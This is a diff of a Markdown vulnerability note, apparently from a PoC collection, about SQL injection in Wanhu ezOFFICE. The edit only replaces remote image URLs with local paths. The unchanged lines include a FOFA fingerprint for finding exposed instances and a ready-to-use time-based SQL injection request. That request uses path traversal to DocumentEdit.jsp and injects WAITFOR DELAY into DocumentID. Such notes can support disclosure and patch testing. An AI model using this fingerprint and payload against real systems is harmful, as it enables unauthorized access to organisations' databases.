@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![1](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131047757.png)
+![1](./images/202209131047757.png)
 
 验证POC
 
@@ -28,6 +28,6 @@ app="万户网络-ezOFFICE"
 /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--
 ```
 
-![1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131047397.png)
+![1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a](./images/202209131047397.png)
 
-![3](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131047713.png)
+![3](./images/202209131047713.png)
